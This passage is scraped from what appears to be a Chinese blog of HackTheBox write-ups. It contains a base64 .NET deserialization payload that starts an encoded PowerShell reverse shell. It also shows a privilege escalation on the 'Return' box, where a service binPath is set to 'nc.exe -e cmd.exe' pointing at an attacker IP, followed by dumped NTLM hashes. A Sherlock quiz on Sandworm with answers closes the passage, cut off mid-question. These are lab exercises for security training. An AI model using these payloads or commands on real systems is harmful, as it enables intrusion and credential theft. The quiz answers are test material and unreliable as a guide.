nQUZNQWVRQnpBSFFBWlFCdEFDNEFWQUJsQUhnQWRBQXVBRUVBVXdCREFFa0FTUUJGQUc0QVl3QnZBR1FBYVFCdUFHY0FLUUF1QUVjQVpRQjBBRk1BZEFCeUFHa0FiZ0JuQUNnQUpBQmlBSGtBZEFCbEFITUFMQUF3QUN3QUlBQWtBR2tBS1FBN0FDUUFjd0JsQUc0QVpBQmlBR0VBWXdCckFDQUFQUUFnQUNnQWFRQmxBSGdBSUFBa0FHUUFZUUIwQUdFQUlBQXlBRDRBSmdBeEFDQUFmQUFnQUU4QWRRQjBBQzBBVXdCMEFISUFhUUJ1QUdjQUlBQXBBRHNBSkFCekFHVUFiZ0JrQUdJQVlRQmpBR3NBTWdBZ0FEMEFJQUFrQUhNQVpRQnVBR1FBWWdCaEFHTUFhd0FnQUNzQUlBQWlBRkFBVXdBZ0FDSUFJQUFyQUNBQUtBQndBSGNBWkFBcEFDNEFVQUJoQUhRQWFBQWdBQ3NBSUFBaUFENEFJQUFpQURzQUpBQnpBR1VBYmdCa0FHSUFlUUIwQUdVQUlBQTlBQ0FBS0FCYkFIUUFaUUI0QUhRQUxnQmxBRzRBWXdCdkFHUUFhUUJ1QUdjQVhRQTZBRG9BUVFCVEFFTUFTUUJKQUNrQUxnQkhBR1VBZEFCQ0FIa0FkQUJsQUhNQUtBQWtBSE1BWlFCdUFHUUFZZ0JoQUdNQWF3QXlBQ2tBT3dBa0FITUFkQUJ5QUdVQVlRQnRBQzRBVndCeUFHa0FkQUJsQUNnQUpBQnpBR1VBYmdCa0FHSUFlUUIwQUdVQUxBQXdBQ3dBSkFCekFHVUFiZ0JrQUdJQWVRQjBBR1VBTGdCTUFHVUFiZ0JuQUhRQWFBQXBBRHNBSkFCekFIUUFjZ0JsQUdFQWJRQXVBRVlBYkFCMUFITUFhQUFvQUNrQWZRQTdBQ1FBWXdCc0FHa0FaUUJ1QUhRQUxnQkRBR3dBYndCekFHVUFLQUFwQUE9PSIgU3RhbmRhcmRFcnJvckVuY29kaW5nPSJ7eDpOdWxsfSIgU3RhbmRhcmRPdXRwdXRFbmNvZGluZz0ie3g6TnVsbH0iIFVzZXJOYW1lPSIiIFBhc3N3b3JkPSJ7eDpOdWxsfSIgRG9tYWluPSIiIExvYWRVc2VyUHJvZmlsZT0iRmFsc2UiIEZpbGVOYW1lPSJjbWQiIC8+DQogICAgICA8L3NkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgIDwvc2Q6UHJvY2Vzcz4NCiAgPC9PYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U+DQo8L09iamVjdERhdGFQcm92aWRlcj4LCw==UPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAMAgAAAE5TeXN0ZW0uRGF0YSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAABNTeXN0ZW0uRGF0YS5EYXRhU2V0CgAAABZEYXRhU2V0LlJlbW90aW5nRm9ybWF0E0RhdGFTZXQuRGF0YVNldE5hbWURRGF0YVNldC5OYW1lc3BhY2UORGF0YVNldC5QcmVmaXgVRGF0YVNldC5DYXNlU2Vuc2l0aXZlEkRhdGFTZXQuTG9jYWxlTENJRBpEYXRhU2V0LkVuZm9yY2VDb25zdHJhaW50cxpEYXRhU2V0LkV4dGVuZGVkUHJvcGVydGllcxREYXRhU2V0LlRhYmxlcy5Db3VudBBEYXRhU2V0LlRhYmxlc18wBAEBAQAAAAIABx9TeXN0ZW0uRGF0YS5TZXJpYWxpemF0aW9uRm9ybWF0AgAAAAEIAQgCAgAAAAX9////H1N5c3RlbS5EYXRhLlNlcmlhbGl6YXRpb25Gb3JtYXQBAAAAB3ZhbHVlX18ACAIAAAABAAAABgQAAAAACQQAAAAJBAAAAAAJBAAAAAoBAAAACQUAAAAPBQAAANMIAAACAAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAA9Q88P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIHBvd2Vyc2hlbGwgLWUgSkFCakFHd0FhUUJsQUc0QWRBQWdBRDBBSUFCT0FHVUFkd0F0QUU4QVlnQnFBR1VBWXdCMEFDQUFVd0I1QUhNQWRBQmxBRzBBTGdCT0FHVUFkQUF1QUZNQWJ3QmpBR3NBWlFCMEFITUFMZ0JVQUVNQVVBQkRBR3dBYVFCbEFHNEFkQUFvQUNJQU1RQXdBQzRBTVFBd0FDNEFNUUEyQUM0QU1RQXhBQ0lBTEFBNUFEQUFNQUF4QUNrQU93QWtBSE1BZEFCeUFHVUFZUUJ0QUNBQVBRQWdBQ1FBWXdCc0FHa0FaUUJ1QUhRQUxnQkhBR1VBZEFCVEFIUUFjZ0JsQUdFQWJRQW9BQ2tBT3dCYkFHSUFlUUIwQUdVQVd3QmRBRjBBSkFCaUFIa0FkQUJsQUhNQUlBQTlBQ0FBTUFBdUFDNEFOZ0ExQURVQU13QTFBSHdBSlFCN0FEQUFmUUE3QUhjQWFBQnBBR3dBWlFBb0FDZ0FKQUJwQUNBQVBRQWdBQ1FBY3dCMEFISUFaUUJoQUcwQUxnQlNBR1VBWVFCa0FDZ0FKQUJpQUhrQWRBQmxBSE1BTEFBZ0FEQUFMQUFnQUNRQVlnQjVBSFFBWlFCekFDNEFUQUJsQUc0QVp3QjBBR2dBS1FBcEFDQUFMUUJ1QUdVQUlBQXdBQ2tBZXdBN0FDUUFaQUJoQUhRQVlRQWdBRDBBSUFBb0FFNEFaUUIzQUMwQVR3QmlBR29BWlFCakFIUUFJQUF0QUZRQWVRQndBR1VBVGdCaEFHMEFaUUFnQUZNQWVRQnpBSFFBWlFCdEFDNEFWQUJsQUhnQWRBQXVBRUVBVXdCREFFa0FTUUJGQUc0QVl3QnZBR1FBYVFCdUFHY0FLUUF1QUVjQVpRQjBBRk1BZEFCeUFHa0FiZ0JuQUNnQUpBQmlBSGtBZEFCbEFITUFMQUF3QUN3QUlBQWtBR2tBS1FBN0FDUUFjd0JsQUc0QVpBQmlBR0VBWXdCckFDQUFQUUFnQUNnQWFRQmxBSGdBSUFBa0FHUUFZUUIwQUdFQUlBQXlBRDRBSmdBeEFDQUFmQUFnQUU4QWRRQjBBQzBBVXdCMEFISUFhUUJ1QUdjQUlBQXBBRHNBSkFCekFHVUFiZ0JrQUdJQVlRQmpBR3NBTWdBZ0FEMEFJQUFrQUhNQVpRQnVBR1FBWWdCaEFHTUFhd0FnQUNzQUlBQWlBRkFBVXdBZ0FDSUFJQUFyQUNBQUtBQndBSGNBWkFBcEFDNEFVQUJoQUhRQWFBQWdBQ3NBSUFBaUFENEFJQUFpQURzQUpBQnpBR1VBYmdCa0FHSUFlUUIwQUdVQUlBQTlBQ0FBS0FCYkFIUUFaUUI0QUhRQUxnQmxBRzRBWXdCdkFHUUFhUUJ1QUdjQVhRQTZBRG9BUVFCVEFFTUFTUUJKQUNrQUxnQkhBR1VBZEFCQ0FIa0FkQUJsQUhNQUtBQWtBSE1BWlFCdUFHUUFZZ0JoQUdNQWF3QXlBQ2tBT3dBa0FITUFkQUJ5QUdVQVlRQnRBQzRBVndCeUFHa0FkQUJsQUNnQUpBQnpBR1VBYmdCa0FHSUFlUUIwQUdVQUxBQXdBQ3dBSkFCekFHVUFiZ0JrQUdJQWVRQjBBR1VBTGdCTUFHVUFiZ0JuQUhRQWFBQXBBRHNBSkFCekFIUUFjZ0JsQUdFQWJRQXVBRVlBYkFCMUFITUFhQUFvQUNrQWZRQTdBQ1FBWXdCc0FHa0FaUUJ1QUhRQUxnQkRBR3dBYndCekFHVUFLQUFwQUE9PSIgU3RhbmRhcmRFcnJvckVuY29kaW5nPSJ7eDpOdWxsfSIgU3RhbmRhcmRPdXRwdXRFbmNvZGluZz0ie3g6TnVsbH0iIFVzZXJOYW1lPSIiIFBhc3N3b3JkPSJ7eDpOdWxsfSIgRG9tYWluPSIiIExvYWRVc2VyUHJvZmlsZT0iRmFsc2UiIEZpbGVOYW1lPSJjbWQiIC8+DQogICAgICA8L3NkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgIDwvc2Q6UHJvY2Vzcz4NCiAgPC9PYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U+DQo8L09iamVjdERhdGFQcm92aWRlcj4LCw==ERROR_GENERAL;Error deserializing sales order: Exception has been thrown by the target of an invocation.$ rlwrap -cAr nc -lvnp 9001Listening on 0.0.0.0 9001Connection received on 10.10.11.168 57400whoamint authority\\systemPS C:\\Windows\\system32&gt; cd C:\\users got it shell as nt authorityHashes1234567891011121314151617administrator:500:aad3b435b51404eeaad3b435b51404ee:e2bba07a8348bca150ac6ffee6a3afbb:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0d3c072340cb5cdfca9c7f86e47a0beb:::tstar:1106:aad3b435b51404eeaad3b435b51404ee:5b8b52689acd5a0e6587f9c8d3b07fc7:::asmith:1107:aad3b435b51404eeaad3b435b51404ee:0a7e978fd5e254ce555e5fed405bba29:::sjenkins:1118:aad3b435b51404eeaad3b435b51404ee:ac5495fa8515a5e8c3437a293b405e26:::sdonington:1119:aad3b435b51404eeaad3b435b51404ee:ac5495fa8515a5e8c3437a293b405e26:::backupsvc:1601:aad3b435b51404eeaad3b435b51404ee:6f410302e092bdcf7802401cc55e4a4d:::jhall:1603:aad3b435b51404eeaad3b435b51404ee:dfdcc85f5a1c9eaf0592f36582f3b871:::rsmith:1604:aad3b435b51404eeaad3b435b51404ee:dfdcc85f5a1c9eaf0592f36582f3b871:::ehooker:1605:aad3b435b51404eeaad3b435b51404ee:a0a5fa8b2f1df7d4acfca315e4a3ba82:::khicks:1611:aad3b435b51404eeaad3b435b51404ee:589cf9b5f911fd6fe70694a4ba4bccd0:::sqlsvc:1613:aad3b435b51404eeaad3b435b51404ee:b999a16500b87d17ec7f2e2a68778f05:::miscsvc:1617:aad3b435b51404eeaad3b435b51404ee:c959a21bb08e42e36ff9f0fa434caab5:::ksimpson:1619:aad3b435b51404eeaad3b435b51404ee:5f38c0485f0c23f8dedf9bf23ffa5336:::DC1$:1000:aad3b435b51404eeaad3b435b51404ee:1d7221130f867a5e322111846a1b8642:::WS01$:1120:aad3b435b51404eeaad3b435b51404ee:327202ce3bff07c2ea53d7f25d162fcb:::","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://example.com/tags/writeup/"}]},{"title":"HackTheBox——Tracks AD Return","slug":"Return/HackTheBox——Tracks AD Return","date":"2025-06-19T13:59:05.103Z","updated":"2025-06-19T13:59:05.103Z","comments":true,"path":"2025/06/19/Return/HackTheBox——Tracks AD Return/","permalink":"http://example.com/2025/06/19/Return/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Return/","excerpt":"","text":"Welcome to N0nome&#96;s F**king blog.(:This is just a joke:)Do you want to become stronger than me? You just need to move your hands more. 鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习 nmap1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus80/tcp open http Microsoft IIS httpd 10.0|_http-server-header: Microsoft-IIS/10.0| http-methods: |_ Potentially risky methods: TRACE |_http-title: HTB Printer Admin Panel88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-04-30 01:47:09Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)445/tcp open microsoft-ds? 464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)3269/tcp open tcpwrapped5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found9389/tcp open mc-nmf .NET Message Framing47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Not Found|_http-server-header: Microsoft-HTTPAPI/2.049664/tcp open msrpc Microsoft Windows RPC49665/tcp open msrpc Microsoft Windows RPC49666/tcp open msrpc Microsoft Windows RPC49667/tcp open msrpc Microsoft Windows RPC49671/tcp open msrpc Microsoft Windows RPC49674/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049675/tcp open msrpc Microsoft Windows RPC49677/tcp open msrpc Microsoft Windows RPC49680/tcp open msrpc Microsoft Windows RPC49698/tcp open msrpc Microsoft Windows RPCWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portAggressive OS guesses: Microsoft Windows Server 2016 (96%), Microsoft Windows Server 2019 (96%), Microsoft Windows 10 (93%), Microsoft Windows 10 1709 - 21H2 (93%), Microsoft Windows 10 21H1 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Server 2022 (93%), Microsoft Windows 10 1903 (92%), Windows Server 2019 (92%), Microsoft Windows Vista SP1 (92%)No exact OS matches for host (test conditions non-ideal).Network Distance: 2 hopsService Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: 18m34s| smb2-security-mode: | 3:1:1: |_ Message signing enabled and required| smb2-time: | date: 2025-04-30T01:48:14|_ start_date: N/A 先把return.local加到hosts里面 smb&#x2F;ldapsmb不能guest和anonymousldap倒是有一点 12345678910111213141516171819202122232425262728293031323334$ ldapsearch -H &#x27;ldap://10.129.49.187&#x27; -x -s base 。。。 dn: domainFunctionality: 7 forestFunctionality: 7 domainControllerFunctionality: 7 rootDomainNamingContext: DC=return,DC=local ldapServiceName: return.local:printer$@RETURN.LOCAL isGlobalCatalogReady: TRUE supportedSASLMechanisms: GSSAPI supportedSASLMechanisms: GSS-SPNEGO 。。。subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=return,DC=localserverName: CN=PRINTER,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Confi guration,DC=return,DC=localschemaNamingContext: CN=Schema,CN=Configuration,DC=return,DC=localnamingContexts: DC=return,DC=localnamingContexts: CN=Configuration,DC=return,DC=localnamingContexts: CN=Schema,CN=Configuration,DC=return,DC=localnamingContexts: DC=DomainDnsZones,DC=return,DC=localnamingContexts: DC=ForestDnsZones,DC=return,DC=localisSynchronized: TRUEhighestCommittedUSN: 110694dsServiceName: CN=NTDS Settings,CN=PRINTER,CN=Servers,CN=Default-First-Site-Na me,CN=Sites,CN=Configuration,DC=return,DC=localdnsHostName: printer.return.localdefaultNamingContext: DC=return,DC=localcurrentTime: 20250430015221.0ZconfigurationNamingContext: CN=Configuration,DC=return,DC=local# search resultsearch: 2result: 0 Success 把printer.return.local也加到hosts里面，在web上看一下 printer.return.localsettings.php改了一下发现没啥反应，先爆破一下目录，顺带上一下burp他也只向server提交了IP，别的没看出啥变化来接着枚举一下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980$ python3 /home/wansh/Downloads/enum4linux-ng/enum4linux-ng.py -A 10.129.49.187 ========================== | Target Information | ========================== [*] Target ........... 10.129.49.187 [*] Username ......... &#x27;&#x27; [*] Random Username .. &#x27;uomvfqhs&#x27; [*] Password ......... &#x27;&#x27; [*] Timeout .......... 5 second(s) ====================================== | Listener Scan on 10.129.49.187 | ====================================== [*] Checking LDAP [+] LDAP is accessible on 389/tcp [*] Checking LDAPS[+] LDAPS is accessible on 636/tcp[*] Checking SMB[+] SMB is accessible on 445/tcp[*] Checking SMB over NetBIOS[+] SMB over NetBIOS is accessible on 139/tcp =====================================================| Domain Information via LDAP for 10.129.49.187 | =====================================================[*] Trying LDAP[+] Appears to be root/parent DC[+] Long domain name is: return.local ==========================================| SMB Dialect Check on 10.129.49.187 | ==========================================[*] Trying on 445/tcp[+] Supported dialects and settings:Supported dialects: SMB 1.0: false SMB 2.02: true SMB 2.1: true SMB 3.0: true SMB 3.1.1: truePreferred dialect: SMB 3.0SMB1 only: falseSMB signing required: true ============================================================| Domain Information via SMB session for 10.129.49.187 | ============================================================[*] Enumerating via unauthenticated SMB session on 445/tcp[+] Found domain information via SMBNetBIOS computer name: PRINTERNetBIOS domain name: RETURNDNS domain: return.localFQDN: printer.return.localDerived membership: domain memberDerived domain: RETURN==========================================| RPC Session Check on 10.129.49.187 | ==========================================[*] Check for null session[+] Server allows session using username &#x27;&#x27;, password &#x27;&#x27; ====================================================| Domain Information via RPC for 10.129.49.187 | ====================================================[+] Domain: RETURN[+] Domain SID: S-1-5-21-3750359090-2939318659-876128439[+] Membership: domain member ================================================| OS Information via RPC for 10.129.49.187 | ================================================[*] Enumerating via unauthenticated SMB session on 445/tcp[+] Found OS information via SMB[+] After merging OS information we have the following result:OS: Windows 10, Windows Server 2019, Windows Server 2016OS version: &#x27;10.0&#x27;OS release: &#x27;1809&#x27;OS build: &#x27;17763&#x27;Native OS: not supportedNative LAN manager: not supportedPlatform id: nullServer type: nullServer type string: null 只有domain sid，其他的也没有利用点，还是回归settings.php他返回只返回IP，那就只改IP，在本地监听389端口 12345678$ sudo rlwrap -cAr nc -lvnp 389[sudo] wansh 的密码：Listening on 0.0.0.0 389Connection received on 10.129.49.187 549500*`%return\\svc-printer0*`%return\\svc-printer 1edFg43012!! 返回了一个密码。。。直接尝试evil-winrm登录中间修了一下evil-winrm 12345678910111213$ sudo evil-winrm -i 10.129.49.187 -u svc-printer -p &#x27;1edFg43012!!&#x27;/root/.local/share/gem/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining &#x27;object_id&#x27; may cause serious problems/root/.local/share/gem/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining &#x27;object_id&#x27; may cause serious problems Evil-WinRM shell v3.7 Warning: Remote path completions is disabled due to ruby limitation: undefined method &#x27;quoting_detection_proc&#x27; for module Reline Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\svc-printer\\Documents&gt; shell as svc-printer看下权限 123456789101112131415161718*Evil-WinRM* PS C:\\Users\\svc-printer\\desktop&gt; whoami /privPRIVILEGES INFORMATION----------------------Privilege Name Description State============================= =================================== =======SeMachineAccountPrivilege Add workstations to domain EnabledSeLoadDriverPrivilege Load and unload device drivers EnabledSeSystemtimePrivilege Change the system time EnabledSeBackupPrivilege Back up files and directories EnabledSeRestorePrivilege Restore files and directories EnabledSeShutdownPrivilege Shut down the system EnabledSeChangeNotifyPrivilege Bypass traverse checking EnabledSeRemoteShutdownPrivilege Force shutdown from a remote system EnabledSeIncreaseWorkingSetPrivilege Increase a process working set EnabledSeTimeZonePrivilege Change the time zone Enabled 其中给的权限很多，不过先枚举一下 12345678910111213141516171819202122232425262728*Evil-WinRM* PS C:\\Users\\svc-printer\\desktop&gt; net user svc-printerUser name svc-printerFull Name SVCPrinterComment Service Account for PrinterUser&#x27;s commentCountry/region code 000 (System Default)Account active YesAccount expires NeverPassword last set 5/26/2021 1:15:13 AMPassword expires NeverPassword changeable 5/27/2021 1:15:13 AMPassword required YesUser may change password YesWorkstations allowed AllLogon scriptUser profileHome directoryLast logon 5/26/2021 1:39:29 AMLogon hours allowed AllLocal Group Memberships *Print Operators *Remote Management Use *Server OperatorsGlobal Group memberships *Domain UsersThe command completed successfully. 这里可以看到svc-printer是Server Operators组的成员，也是Print Operators组的成员，分别看下两个组都还有哪些 12345678910111213141516171819*Evil-WinRM* PS C:\\Users\\svc-printer\\desktop&gt; net localgroup &quot;Server Operators&quot;Alias name Server OperatorsComment Members can administer domain serversMembers-------------------------------------------------------------------------------svc-printerThe command completed successfully.*Evil-WinRM* PS C:\\Users\\svc-printer\\desktop&gt; net localgroup &quot;Print Operators&quot;Alias name Print OperatorsComment Members can administer printers installed on domain controllersMembers-------------------------------------------------------------------------------svc-printerThe command completed successfully. PRINT那个组可以理解，看一下server那个组有么有利用的方式找到一篇详细的利用文章跟着他给的利用一下具体滥用细节可以看一下文章 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859*Evil-WinRM* PS C:\\Users\\svc-printer\\desktop&gt; servicesPath Privileges Service ---- ---------- ------- C:\\Windows\\ADWS\\Microsoft.ActiveDirectory.WebServices.exe True ADWS \\??\\C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\&#123;5533AFC7-64B3-4F6E-B453-E35320B35716&#125;\\MpKslDrv.sys True MpKslceeb2796 C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\SMSvcHost.exe True NetTcpPortSharingC:\\Windows\\SysWow64\\perfhost.exe True PerfHost &quot;C:\\Program Files\\Windows Defender Advanced Threat Protection\\MsSense.exe&quot; False Sense C:\\Windows\\servicing\\TrustedInstaller.exe False TrustedInstaller &quot;C:\\Program Files\\VMware\\VMware Tools\\VMware VGAuth\\VGAuthService.exe&quot; True VGAuthService &quot;C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe&quot; True VMTools &quot;C:\\ProgramData\\Microsoft\\Windows Defender\\platform\\4.18.2104.14-0\\NisSrv.exe&quot; True WdNisSvc &quot;C:\\ProgramData\\Microsoft\\Windows Defender\\platform\\4.18.2104.14-0\\MsMpEng.exe&quot; True WinDefend &quot;C:\\Program Files\\Windows Media Player\\wmpnetwk.exe&quot; False WMPNetworkSvc #挑选vss作为狩猎对象*Evil-WinRM* PS C:\\Users\\svc-printer\\desktop&gt; wget http://10.10.16.3:9090/nc.exe -O nc.exe#上传nc*Evil-WinRM* PS C:\\Users\\svc-printer\\desktop&gt; sc.exe config VMTools binPath=&quot;C:\\Users\\svc-printer\\desktop\\nc.exe -e cmd.exe 10.10.16.3 9002&quot;[SC] ChangeServiceConfig SUCCESS#进行滥用，reverse shell插入*Evil-WinRM* PS C:\\Users\\svc-printer\\desktop&gt; sc.exe stop VMToolsSERVICE_NAME: VMTools TYPE : 10 WIN32_OWN_PROCESS STATE : 1 STOPPED WIN32_EXIT_CODE : 0 (0x0) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 WAIT_HINT : 0x0*Evil-WinRM* PS C:\\Users\\svc-printer\\desktop&gt; sc.exe start VMTools#启动shell$ rlwrap -cAr nc -lvnp 9002Listening on 0.0.0.0 9002Connection received on 10.129.49.187 59320Microsoft Windows [Version 10.0.17763.107](c) 2018 Microsoft Corporation. All rights reserved.C:\\Windows\\system32&gt;C:\\Users\\svc-printer\\desktop\\rev.exeC:\\Users\\svc-printer\\desktop\\rev.exeC:\\Windows\\system32&gt;C:\\Windows\\system32&gt;#由于反弹shell存活时间短，直接快速把之前上传的msf再启动一下meterpreter &gt; shellProcess 4688 created.Channel 1 created.Microsoft Windows [Version 10.0.17763.107](c) 2018 Microsoft Corporation. All rights reserved.C:\\Windows\\system32&gt;whoamiwhoamint authority\\system Hashes12345Administrator:500:aad3b435b51404eeaad3b435b51404ee:32db622ed9c00dd1039d8288b0407460:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4e48ce125611add31a32cd79e529964b:::svc-printer:1103:aad3b435b51404eeaad3b435b51404ee:c1d26bdcecf44246b5f8653284331a2e:::PRINTER$:1000:aad3b435b51404eeaad3b435b51404ee:0db6da84f360fe606a4eb8ac97165bad:::","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://example.com/tags/writeup/"}]},{"title":"HackTheBox——SherLock——UFO-1","slug":"HackTheBox——SherLock——UFO-1/HackTheBox——SherLock—— UFO-1","date":"2025-06-19T13:59:05.091Z","updated":"2025-06-19T13:59:05.091Z","comments":true,"path":"2025/06/19/HackTheBox——SherLock——UFO-1/HackTheBox——SherLock—— UFO-1/","permalink":"http://example.com/2025/06/19/HackTheBox%E2%80%94%E2%80%94SherLock%E2%80%94%E2%80%94UFO-1/HackTheBox%E2%80%94%E2%80%94SherLock%E2%80%94%E2%80%94%20UFO-1/","excerpt":"","text":"Welcome to N0nome&#96;s F**king blog.(:This is just a joke:)Do you want to become stronger than me? You just need to move your hands more. 鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习 Sherlock Scenario123Being in the ICS Industry, your security team always needs to be up to date and should be aware of the threats targeting organizations in your industry. You just started as a Threat intelligence intern, with a bit of SOC experience. Your manager has given you a task to test your skills in research and how well can you utilize Mitre Att&amp;ck to your advantage. Do your research on Sandworm Team, also known as BlackEnergy Group and APT44. Utilize Mitre ATT&amp;CK to understand how to map adversary behavior and tactics in actionable form. Smash the assessment and impress your manager as Threat intelligence is your passion.在 ICS 行业中，您的安全团队始终需要了解最新情况，并且应该了解针对您所在行业组织的威胁。您刚开始担任威胁情报实习生，拥有一些 SOC 经验。您的经理给了您一项任务来测试您的研究技能以及您如何充分利用 Mitre Att&amp;ck 来发挥自己的优势。对 Sandworm Team（也称为 BlackEnergy Group 和 APT44）进行研究。利用 Mitre ATT&amp;CK 了解如何以可操作的形式绘制对手的行为和策略。粉碎评估并给您的经理留下深刻印象，因为威胁情报是您的热情所在。 Task1According to the sources cited by Mitre, in what year did the Sandworm Team begin operations?让我们评估Sandworm Team，Google一下问题中他是哪一年运作的直接找到Mitre，它提示说 12Sandworm Team is a destructive threat group that has been attributed to Russia&#x27;s General Staff Main Intelligence Directorate (GRU) Main Center for Special Technologies (GTsST) military unit 74455.[1][2] This group has been active since at least 2009.[3][4][5][6]Sandworm团队是一个破坏性的威胁组织，归因于俄罗斯总参谋长主要情报局（GRU）特殊技术主要中心（GTSST）军事部队74455。 [1] [2]至少自2009年以来，该小组一直活跃。 3] [4] [5] [6] 自2009以来Answer：2009 Task2Mitre notes two credential access techniques used by the BlackEnergy group to access several hosts in the compromised network during a 2016 campaign against the Ukrainian electric power grid. One is LSASS Memory access (T1003.001). What is the Attack ID for the other?Mitre 注意到 BlackEnergy 组织在 2016 年针对乌克兰电网的攻击活动中使用了两种凭证访问技术来访问被入侵网络中的多个主机。 一种是 LSASS 内存访问 (T1003.001)。 另一个的攻击 ID 是什么？根据提示先找BlackEnergy组织去，然后根据攻击找到另一个攻击id从这里可以间接找到2016年的攻击事件从里面找凭证访问技术有关的Answer:T1110 Task3During the 2016 campaign, the adversary was observed using a VBS script during their operations. What is the name of the VBS file?在 2016 年的竞选活动中，观察到对手在行动中使用了 VBS 脚本。 VBS 文件的名称是什么？下滑可以找到Answer:ufn.vbs Task4The APT conducted a major campaign in 2022. The server application was abused to maintain persistence. What is the Mitre Att&amp;ck ID for the persistence technique was used by the group to allow them remote access?APT 在 2022 年开展了一次大规模行动。 服务器应用程序被滥用来维持持久性。 该团伙使用持久性技术允许他们进行远程访问，那么该技术的 Mitre Att&amp;ck ID 是什么？我们去找2022年的上面的Caddywiper是计划清除任务Answer:T1505.003 Task5What is the name of the malware / tool used in question 4?问webshell的名字Answer:Neo-Regeorg Task6Which SCADA application binary was abused by the group to achieve code execution on SCADA Systems in the same campaign in 2022?在 2022 年的同一次行动中，该组织滥用了哪个 SCADA 应用程序二进制文件在 SCADA 系统上执行代码？直接找一下Answer:scilc.exe Task7Identify the full command line associated with the execution of the tool from question 6 to perform actions against substations in the SCADA environment.直接看6的截图Answer:C:\\sc\\prog\\exec\\scilc.exe -do pack\\scil\\s1.txt Task8What malware/tool was used to carry out data destruction in a compromised environment during the same campaign?在同一次活动中，使用了什么恶意软件&#x2F;工具在受损环境中进行数据销毁？task4中我们提了一嘴Answer:Caddywiper Task9The malware/tool identified in question 8 also had additional capabilities. What is the Mitre Att&amp;ck ID of the specific technique it could perform in Execution tactic?问题 8 中确定的恶意软件&#x2F;工具还具有其他功能。 在执行策略中，它可以执行的具体技术的 Mitre Att&amp;ck ID 是什么？点进去看看它还具有解析使用API的能力Answer：T1106 Task10The Sandworm Team is known to use different tools in their campaigns. They are associated with an auto-spreading malware that acted as a ransomware while having worm-like features .What is the name of this 